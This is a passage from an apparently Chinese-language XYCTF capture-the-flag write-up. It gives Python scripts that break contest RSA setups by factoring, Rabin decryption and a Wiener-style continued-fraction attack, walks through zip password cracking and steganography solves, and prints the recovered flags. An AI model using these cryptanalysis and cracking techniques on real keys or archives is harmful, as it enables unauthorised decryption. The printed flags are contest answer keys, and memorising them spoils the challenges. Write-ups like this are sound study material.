class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        temp = input_list[i]</span><br><span class="line">        input_list[i] = input_list[length - <span class="number">1</span> - i]</span><br><span class="line">        input_list[length - <span class="number">1</span> - i] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dec_b = custom_add(b)</span><br><span class="line">bin_str = swap_bits(dec_b)</span><br><span class="line"><span class="comment"># print(bin_str)</span></span><br><span class="line">flag = <span class="number">0b1011000010110010100001101010100010001100111101101100011001101000110001001100110001100110011100000111001001101100010110100110101001101010011000100110100001011010011010000110011001101010011000100101101001110000011100101100001011000010010110100110000001101110011100000110101011000110011010100110100001100110011000100110100001100000011011001111101</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># XYCTF&#123;c4bf3896-5514-4351-89aa-0785c5431406&#125;</span></span><br></pre></td></tr></table></figure><h2 id="crypto-sign1n_revenge"><a class="markdownIt-Anchor" href="#crypto-sign1n_revenge"></a> Crypto Sign1n_Revenge</h2><p>签到题打法。。。</p><h2 id="crypto-happy_to_solve1"><a class="markdownIt-Anchor" href="#crypto-happy_to_solve1"></a> Crypto happy_to_solve1</h2><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = sympy.nextprime(p ^ ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure><p>q是p取反的下一个素数，指路<a href="https://blog.csdn.net/m0_62506844/article/details/124256746">https://blog.csdn.net/m0_62506844/article/details/124256746</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line">c = <span class="number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">t1 = <span class="number">1</span> &lt;&lt; <span class="number">512</span></span><br><span class="line">p = (<span class="number">2</span>**<span class="number">512</span>+gmpy2.iroot((<span class="number">2</span>**<span class="number">512</span>)**<span class="number">2</span>-<span class="number">4</span>*n, <span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line">p = <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">while</span> n % p != <span class="number">0</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="crypto-babyrsamax"><a class="markdownIt-Anchor" href="#crypto-babyrsamax"></a> Crypto babyRSAMAX</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line">n = <span class="number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span></span><br><span class="line">gift1 = <span class="number">4549402444746338327349007235818187793950285105091726167573552412678416759694660166956782755631447271662108564084382098562999950228708300902201571583419116299932264478381197034402338481872937576172197202519770782458343606060544694608852844228400457232100904217062914047342663534138668490328400022651816597367310</span></span><br><span class="line">gift2 = <span class="number">111061215998959709920736448050860427855012026815376672067601244053580566359594802604251992986382187891022583247997994146019970445247509119719411310760491983876636264003942870756402328634092146799825005835867245563420135253048223898334460067523975023732153230791136870324302259127159852763634051238811969161011462</span></span><br><span class="line">c = <span class="number">16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043</span></span><br><span class="line">y = <span class="number">1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217</span></span><br><span class="line">q = GCD(gift2-gift1, n)</span><br><span class="line">p = n//q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">e = <span class="built_in">pow</span>(y, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(e))</span><br><span class="line">e = <span class="number">4096</span></span><br></pre></td></tr></table></figure><p>e=2^12，一开始没有任何思路，但慢慢搜素发现了这个神奇的Rabin体系，之前没好好学QWQ<br /><a href="https://zhuanlan.zhihu.com/p/533927542">https://zhuanlan.zhihu.com/p/533927542</a><br />指路<a href="https://blog.csdn.net/qq_73643549/article/details/134096838">https://blog.csdn.net/qq_73643549/article/details/134096838</a><br />又或者NewStar2023 week4 signin</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span></span><br><span class="line">gift1 = <span class="number">4549402444746338327349007235818187793950285105091726167573552412678416759694660166956782755631447271662108564084382098562999950228708300902201571583419116299932264478381197034402338481872937576172197202519770782458343606060544694608852844228400457232100904217062914047342663534138668490328400022651816597367310</span></span><br><span class="line">gift2 = <span class="number">111061215998959709920736448050860427855012026815376672067601244053580566359594802604251992986382187891022583247997994146019970445247509119719411310760491983876636264003942870756402328634092146799825005835867245563420135253048223898334460067523975023732153230791136870324302259127159852763634051238811969161011462</span></span><br><span class="line">c = <span class="number">16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043</span></span><br><span class="line">y = <span class="number">1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217</span></span><br><span class="line">q = GCD(gift2-gift1, n)</span><br><span class="line">p = n//q</span><br><span class="line">inv_p = inverse(p, q)</span><br><span class="line">inv_q = inverse(q, p)</span><br><span class="line">cs = [c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cs:</span><br><span class="line">        r = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">        s = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">        x = (r*inv_q*q + s * inv_p * p) % n</span><br><span class="line">        y = (r*inv_q*q - s * inv_p * p) % n</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(x)</span><br><span class="line">        <span class="keyword">if</span> n - x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - x)</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(y)</span><br><span class="line">        <span class="keyword">if</span> n - y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - y)</span><br><span class="line">    cs = ps  <span class="comment"># 嵌套</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;XYCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="crypto-factor1"><a class="markdownIt-Anchor" href="#crypto-factor1"></a> Crypto factor1</h2><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">512</span>)</span><br><span class="line">e = gmpy2.invert(d, (p**<span class="number">3</span> - <span class="number">1</span>) * (q**<span class="number">3</span> - <span class="number">1</span>))</span><br><span class="line">flag = <span class="string">&quot;XYCTF&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(p + q).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(p * q)</span><br><span class="line"><span class="comment">#172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span></span><br><span class="line"><span class="comment">#99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的近似值为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">n^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span><br />套安恒书上的一个脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">e=</span><br><span class="line">n=</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContinuedFraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        self.numberlist = []</span><br><span class="line">        self.fractionlist = []</span><br><span class="line">        self.GenerateNumberList(numerator, denumerator)</span><br><span class="line">        self.GenerateFractionList()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateNumberList</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        <span class="keyword">while</span> numerator != <span class="number">1</span>:</span><br><span class="line">            quotient = numerator//denumerator</span><br><span class="line">            remainder = numerator % denumerator</span><br><span class="line">            self.numberlist.append(quotient)</span><br><span class="line">            numerator = denumerator</span><br><span class="line">            denumerator = remainder</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateFractionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.fractionlist.append([self.numberlist[<span class="number">0</span>], <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.numberlist)):</span><br><span class="line">            numerator = self.numberlist[i]</span><br><span class="line">            denumerator = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                temp = numerator</span><br><span class="line">                numerator = denumerator+numerator*self.numberlist[i-j-<span class="number">1</span>]</span><br><span class="line">                denumerator = temp</span><br><span class="line">            self.fractionlist.append([numerator, denumerator])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = ContinuedFraction(e, n**<span class="number">3</span>)</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> a.fractionlist:</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    phi = (e * d - <span class="number">1</span>) // k  </span><br><span class="line">    result.append(phi)</span><br><span class="line">x = Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> result:</span><br><span class="line">    f = n**<span class="number">3</span>-x**<span class="number">3</span>+<span class="number">3</span>*n*x-phi+<span class="number">1</span></span><br><span class="line">    flag = solve(f, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;XYCTF&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(flag).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="crypto-factor3"><a class="markdownIt-Anchor" href="#crypto-factor3"></a> Crypto factor3</h2><p>维纳攻击，连分数分解，跟上面一样，只是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的近似值换成了<code>pow(n+1,2)</code>，或者<code>pow(n,2)</code>，都能把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>找到<br /><code>c=d**2^m</code>，<code>m=c^(d**2)</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> result:</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    flag = long_to_bytes(c ^ (d**<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;XYCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;XYCTF&#123;I_love_to_read_the_crypto_paper_and_try_to_ak_them&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>看到这个flag的时候确实翻了看了不少paper，但都没能找到正确的攻击方法，但通过这两题，我好像发现了窍门，就是找到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的近似值(与n相关)就可以了，这种方法应该是对p和q有限制的，但题目是肯定满足条件的</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="misc-签到"><a class="markdownIt-Anchor" href="#misc-签到"></a> Misc 签到</h2><p>公众号题，跳过</p><h2 id="misc-真签到"><a class="markdownIt-Anchor" href="#misc-真签到"></a> Misc 真&gt;签到</h2><p>010无需多言<br />XYCTF{59bd0e77d13c_1406b23219e_f91cf3a_153e8ea4_77508ba}</p><h2 id="misc-ez_隐写"><a class="markdownIt-Anchor" href="#misc-ez_隐写"></a> Misc ez_隐写</h2><p>爆破没有用，binwalk看看，提示图片损坏，压缩软件和虚拟机都提示crc值错误，说明宽高必然不对<br />010一看，高太大了，改成高等宽试试，保存发现图片可以查看了，右下角提示，XYCTF开赛时间，这不20240401嘛<br />结果输进去死活都不对，队友可以，结果一试，我只有在7zip里面才可以打开<br />附一张水印图<br /><img src="https://picx.zhimg.com/80/v2-2eacfd2ac4d59f4701d51b2682fe3856_1440w.jpeg" alt="" /><br />然后就是盲水印提取了，可以拿工具，也可以上脚本，貌似工具不怎么清晰，emm<br />大佬的一个matlab脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">imageA=imread(&#x27;water.jpg&#x27;,&#x27;jpg&#x27;);</span><br><span class="line">fftA=fft2(imageA);</span><br><span class="line">imshow(fftshift(fftA));</span><br><span class="line">imshow(fft(rgb2gray(imread(dec_water.jpg))),[1,2]);</span><br></pre></td></tr></table></figure><h2 id="misc-zzl的护理小课堂"><a class="markdownIt-Anchor" href="#misc-zzl的护理小课堂"></a> Misc zzl的护理小课堂</h2><p>看源代码的话没什么用，把源代码这一段放控制台跑了就行</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flagXhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span><br><span class="line">                        flagXhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;flag.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">                        flagXhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (flagXhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; flagXhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> flag = flagXhr.<span class="property">responseText</span>;</span><br><span class="line">                                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;Flag: &quot;</span> + flag;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                        flagXhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure><p><code>XYCTF&#123;Z21_7elL_YOu_79aaa6f2b520&#125;</code></p><h2 id="misc-彩蛋"><a class="markdownIt-Anchor" href="#misc-彩蛋"></a> Misc 彩蛋？</h2><p><img src="https://picx.zhimg.com/80/v2-f0fd573d20fc6750fee217ab6f521b3e_1440w.png" alt="" /><br />发现两个彩蛋，八进制转码得到<code>XYCTF&#123;this_a_</code>，二进制解码得到<code>find_it&#125;</code>，要注意的是这里7位一组<br />海报webp格式转png，lsb隐写，rgb000<br /><a href="https://cdkm.com/cn/webp-to-png#google_vignette">https://cdkm.com/cn/webp-to-png#google_vignette</a><br />键盘密码，除了常见的QWERTY，还有dvorak<br />xn0jtxgoy.p{urp{lbi{abe{c{ydcbt{frb{jab{<br /><a href="http://wbic16.xedoloh.com/dvorak.html">http://wbic16.xedoloh.com/dvorak.html</a><br />随波逐流也可以，但是要知道是dvorak解密<br /><code>XYCTF&#123;this_a_bl0ckbuster_for_png_and_i_think_yon_can_find_it&#125;</code></p><p>赛后发现原来lsb隐写可以不手动？<br /><code>kali: zsteg -a aa.png </code><br />好东西啊</p><h2 id="misc-熊博士"><a class="markdownIt-Anchor" href="#misc-熊博士"></a> Misc 熊博士</h2><p><code>CBXGU&#123;ORF_BV_NVR_BLF_CRZL_QQ&#125;</code><br />把<code>CBXGUORFBVNVRBLFCRZLQQ</code>放入随波逐流<br />得到<code>Atbash解码:xyctfliuyemeiyouxiaojj</code><br />再根据提示<br /><code>XYCTF&#123;liu_ye_mei_you_xiao_jj&#125;</code></p><h2 id="misc-game"><a class="markdownIt-Anchor" href="#misc-game"></a> Misc game</h2><p>百度识图就是lj，前几天梯子订阅出了点问题，今天好了，谷歌识图一把出<br /><code>XYCTF&#123;Papers Please&#125;</code><br />(本人不玩Steam)</p><h2 id="misc-zip神之套"><a class="markdownIt-Anchor" href="#misc-zip神之套"></a> Misc ZIP神之套</h2><p>把exe文件拖入小黑窗，得到<code>xyctf????????ftcyx</code><br />用ARCHPR，进行掩码攻击，得到密码<code>xyctf20240401ftcyx</code><br />再用ARCHPR进行已知明文攻击，保存已解密的压缩包<br />然后在flag.md中发现flag，<code>XYCTF&#123;1A4B8-C9D2F3E-6A4B8C-9D2F3E7F&#125;</code></p><h2 id="misc-tpcl"><a class="markdownIt-Anchor" href="#misc-tpcl"></a> Misc TPCL</h2><p>搬出我最有实力的pwn爹的blog<br /><a href="https://qanux.github.io/2023/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BD%BF%E7%94%A8gdb%E6%9D%A5%E8%B0%83%E8%AF%95%E5%BC%82%E6%9E%84%E7%A8%8B%E5%BA%8F/">https://qanux.github.io/2023/11/16/记一次使用gdb来调试异构程序/</a><br />用qemu-user执行文件<br /><img src="https://picx.zhimg.com/80/v2-9b1f56a80a41e4c67696bad75ea630df_1440w.png" alt="" /><br />1-&gt;0，得到<code>FLAG&#123;PLCT_An4_r0SCv_x0huann0&#125;</code></p><h2 id="misc-ez_base10242"><a class="markdownIt-Anchor" href="#misc-ez_base10242"></a> Misc EZ_Base1024*2</h2><p>base2048<br /><code>מಥൎࢺଳɫअΥٻଯԢڥիɺ୦ࢸЭਘמۊիɎඥࡆڣߣಷܤҾয౽5</code><br />这不直接梭哈？直接搜base2048可能找不到，但是搜素引擎有推荐的(手动狗头)，后面跟着decoder或者online都找得到，又或者某个密码工具箱，我赛后是有看见可以直接梭哈的<br /><a href="https://nerdmosis.com/tools/encode-and-decode-base2048">https://nerdmosis.com/tools/encode-and-decode-base2048</a><br /><code>XYCTF&#123;84ca3a6e-3508-4e34-a5e0-7d0f03084181&#125;</code></p><h2 id="misc-出题有点烦"><a class="markdownIt-Anchor" href="#misc-出题有点烦"></a> Misc 出题有点烦</h2><p>爆破，压缩包密码<code>123456</code>，binwalk(图片5)，再爆破，压缩包密码<code>xyctf</code><br /><code>真的flag：XYCTF&#123;981e5_f3ca30_c841487_830f84_fb433e&#125;</code></p><h2 id="misc-美妙的歌声"><a class="markdownIt-Anchor" href="#misc-美妙的歌声"></a> Misc 美妙的歌声</h2><p>Audacity频谱图-&gt;<code>XYCTF_1s_w3ll</code>，不是flag，那就是密码吧，DeepSound-&gt;<code>XYCTF&#123;T0uch_y0ur_he3rt_d55ply!!&#125;</code></p><h2 id="misc-又是个签到x"><a class="markdownIt-Anchor" href="#misc-又是个签到x"></a> Misc 又是个签到(x)</h2><p><strong>asrmorfe.txt，emoji解一下</strong><br /><a href="https://www.emojiall.com/en/text-translator-page">https://www.emojiall.com/en/text-translator-page</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">A bunch of tired, anxious sweats rushing down evil monkeys and screaming fear. </span><br><span class="line">In the dark and in dark, medical mask of ogre princess, evil lips clap their hands skulls. </span><br><span class="line">The girl<span class="number">&#x27;</span>s couch was softly tearing, slightly frowned scream, scared screamer<span class="number">&#x27;</span>s shirt and footprints, staff member wearing bikini clothes, man no rolling eyes, old woman opening her hands. </span><br><span class="line">An open-hand baby bra in pairs of slippers, covering the cat<span class="number">&#x27;</span>s tears family with medical mask costumes. </span><br><span class="line">The one with the shirt his face and headscarf eyes closed whispers. </span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">一堆疲惫、焦虑的汗水冲下邪恶的猴子，尖叫着恐惧。</span><br><span class="line">在黑暗和黑暗中，食人魔公主的医用面具，邪恶的嘴唇拍手骷髅头。</span><br><span class="line">女孩的沙发轻轻地撕扯着，微微皱着眉头尖叫，吓坏了尖叫者的衬衫和脚印，工作人员穿着比基尼衣服，男人没有翻白眼，老太太张开双手。</span><br><span class="line">一双拖鞋的开放式婴儿胸罩，用医用口罩服装覆盖猫的眼泪家庭。</span><br><span class="line">那个穿着衬衫的人，他的脸和头巾，闭着眼睛，低声说。</span><br></pre></td></tr></table></figure><p><strong>签到.txt</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HWXj+kI2pS+<span class="number">5</span>pSJhDS0oAzlQmziosSr7gUvdXppjSt8BNUTz8oLfE57NkCrVwBBgGul5hHzCcKqyG7U5LWMOXYtzloMsVvdZdPbMZyb+EgYF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+<span class="number">5</span>pSJhDS0oA3fVDcJt/sEYpz9U0yQTrgxTN0kF5G4xTJ5IKqYil2gK3Ml6usGZsucJXa6pCovoeaGSyZNq6T3aX1NOlb5Gt4gF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+<span class="number">5</span>pSJhDS0oAzlQmziosSr7gUvdXppjSt8PPIU/UwIkvINgvGw+oQMCCaOmO7bDsiSxD/r9w3RKRQEfMm/fv+a/<span class="number">5</span>v/NWgauEpoF17+W/S1oLDgQcjGmP6CSHWXj+kI2pS+<span class="number">5</span>pSJhDS0oA2QV+Gu05V1J2eVrbGhHB487Ns8HTVNYrll8P/Xve17NCaOmO7bDsiSxD/r9w3RKRQEfMm/fv+a/<span class="number">5</span>v/NWgauEpoF17+W/S1oLDgQcjGmP6CS1yISnL45ZHzPjs5BGSboyDJXscweSL6g0ptOqql5vhY7Ns8HTVNYrll8P/Xve17NlyvQj9HulYK3sIMIiNTVrv/QYgLgLF9uO3y6uH800Gy0VvmX5a5S5ZEDlkBSgVrDb/KxZEoU9d83Nbzm7yH80p9xX+<span class="number">50</span>C/<span class="number">29u</span>Vc+H6gx1gOTPv9mT6A8qfJoby4BoCS3by65j7WFf6d/XZX0KskX4t1SAjnDpnC8qWVbU6l6Zs9zWhqP0E6UVZEUMUcRZB43hzoYB6fvcRSs8WPoArwl6dY0JrIccPz30xmtzuOLZRKpeJ5IPHFZw5l6Zo68xW/fiYggRz/KqtgFCLvPQ+Lj+<span class="number">6</span>YY1X0zgl8a3xzz5EI9efUoZd30RstP6oPDy17QzTwoaA1OLHZfyIntyJiT9r3x0kLELrvwIFczyH339IGVYqE4qA/Xsd3t/I+jStXiGGCnKCWoqABdtqk7Z22cIzn0lPAiqi9i3hd/IIgrlkygiofpTmBc34UjLRWWFjQgmDQZ8em1hDlVfgd+/<span class="number">93</span>D4BVIn36xgcg2RtYCx2GmXmg5JwRj5pxcBzyOVie5m0U4zHD6Rt0T8GAvCiCf9hhYkBi7lVHe4Sb7op9fpgfXrNunluSOwxS0NlaBKwa1gvE6/BNy2CI2Uv2y4jlPTdIuCNnWbCJsTSczfPJg5PVfyXykQtg4qA/Xsd3t/I+jStXiGGCnKCWoqABdtqk7Z22cIzn0lLw/priteJqeyg6psALOE5HEboNbEbOkupEDq1HXrfGn2CI2Uv2y4jlPTdIuCNnWbCJsTSczfPJg5PVfyXykQtg4qA/Xsd3t/I+jStXiGGCnctoLlIFVYoOgnQM/<span class="number">2</span>Rz5g4eIxaKQoZ+<span class="number">9</span>cRB51n5yxl/BJQA5860fCnVVFSyvS40JdaogrK4AcB+C0gsnUbXVyeX1Kq+MwIHo812Z/<span class="number">0</span>GIAiR+HkJQwgmO7qkogz1vcP4+q7EHUnfXquRurKvZ5jMHz4eIxaKQoZ+<span 